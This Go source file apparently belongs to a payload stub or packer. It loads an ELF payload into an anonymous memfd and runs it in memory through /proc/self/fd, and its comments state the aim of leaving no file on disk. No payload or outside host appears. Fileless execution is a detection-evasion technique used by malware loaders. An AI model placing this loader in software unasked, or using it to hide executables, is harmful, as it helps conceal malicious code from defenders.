//go:build ignore

package main

import (
	"os"
	"runtime"
	"syscall"
	"unsafe"
)

// executeStrategy is the memfd entry point for Linux ELF stubs.
// Writes the payload to an anonymous memfd file and executes it
// in-memory so no file is written to disk.
func executeStrategy(payload []byte) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	if err := executeInMemory(payload); err != nil {
		executeFromTemp(payload)
	}
}

// executeInMemory creates an anonymous in-memory file via memfd_create,
// writes the ELF payload, then exec replaces the current process with it.
func executeInMemory(payload []byte) error {
	name, _ := syscall.BytePtrFromString("mem")
	fd, _, errno := syscall.RawSyscall(
		syscall.SYS_MEMFD_CREATE,
		uintptr(unsafe.Pointer(name)),
		1, // MFD_CLOEXEC
		0,
	)
	if errno != 0 {
		return errno
	}
	defer func() {
		if fd != ^uintptr(0) {
			syscall.Close(int(fd))
		}
	}()

	// Write payload in chunks to the memfd.
	written := 0
	for written < len(payload) {
		n, err := syscall.Write(int(fd), payload[written:])
		if err != nil {
			return err
		}
		if n == 0 {
			break
		}
		written += n
	}

	// Build the /proc/self/fd/<n> path to use as the exec path.
	fdPath := memfdProcPath(int(fd))
	argv := os.Args
	if len(argv) == 0 {
		argv = []string{fdPath}
	}
	env := os.Environ()

	fdPtr, err := syscall.BytePtrFromString(fdPath)
	if err != nil {
		return err
	}
	argvPtrs := makeCStringArray(argv)
	envPtrs := makeCStringArray(env)

	// fexecve is not always available; use execve via the proc fd path instead.
	_, _, errno2 := syscall.RawSyscall(
		syscall.SYS_EXECVE,
		uintptr(unsafe.Pointer(fdPtr)),
		uintptr(unsafe.Pointer(&argvPtrs[0])),
		uintptr(unsafe.Pointer(&envPtrs[0])),
	)
	return errno2
}

// memfdProcPath returns the /proc/self/fd/<n> path for a given fd number.
func memfdProcPath(fd int) string {
	const base = "/proc/self/fd/"
	n := fd
	if n == 0 {
		return base + "0"
	}
	digits := make([]byte, 0, 10)
	for n > 0 {
		digits = append(digits, byte('0'+n%10))
		n /= 10
	}
	// reverse
	for i, j := 0, len(digits)-1; i < j; i, j = i+1, j-1 {
		digits[i], digits[j] = digits[j], digits[i]
	}
	return base + string(digits)
}

// makeCStringArray converts a []string into a null-terminated []*byte suitable
// for passing to execve.
func makeCStringArray(ss []string) []*byte {
	ptrs := make([]*byte, len(ss)+1)
	for i, s := range ss {
		p, _ := syscall.BytePtrFromString(s)
		ptrs[i] = p
	}
	ptrs[len(ss)] = nil
	return ptrs
}
